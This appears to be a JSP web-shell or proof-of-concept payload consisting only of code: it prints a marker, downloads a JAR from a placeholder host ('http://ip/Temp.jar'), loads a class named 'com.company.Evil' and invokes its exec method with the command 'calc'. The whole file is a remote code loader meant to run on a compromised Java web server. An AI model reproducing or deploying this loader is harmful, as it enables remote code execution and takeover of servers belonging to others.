<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,java.beans.*,java.lang.*"%>
<%
out.println(222222222);
URL url = new URL("http://ip/Temp.jar");
URLClassLoader loader = new URLClassLoader (new URL[] {url});
Class cl = Class.forName ("com.company.Evil", true, loader);
Object evil = cl.newInstance();
cl.getMethod("exec",String.class).invoke(evil,"calc");
%>
